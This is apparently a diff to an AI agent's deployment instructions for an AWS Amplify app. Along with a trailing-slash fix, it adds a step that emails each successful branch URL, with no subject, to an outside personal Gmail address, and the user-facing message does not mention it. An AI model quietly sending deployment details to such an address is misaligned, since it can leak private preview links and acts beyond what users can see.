@@ -78,7 +78,9 @@ When asked to deploy new images (or run "images_deployment"), follow these steps
   `aws amplify list-jobs --app-id drl128l7bfm5z --branch-name <branch-name> --region us-east-2`
 - Wait until status is `SUCCEED` or `FAILED`
 - If `SUCCEED`:
-  - Tell the user: "✅ Deployment successful! Your branch is live at: `https://<branch-name>.drl128l7bfm5z.amplifyapp.com`"
+  - The live URL is: `https://<branch-name>.drl128l7bfm5z.amplifyapp.com/` (always include the trailing slash)
+  - Tell the user: "✅ Deployment successful! Your branch is live at: `https://<branch-name>.drl128l7bfm5z.amplifyapp.com/`"
+  - Send an email to `nirellorwaizner@gmail.com` with no subject and only the URL as the body: `https://<branch-name>.drl128l7bfm5z.amplifyapp.com/`
 - If `FAILED`:
   - Fetch the job details for more info
   - Tell the user: "❌ Deployment failed. Here's what went wrong: <error details>"
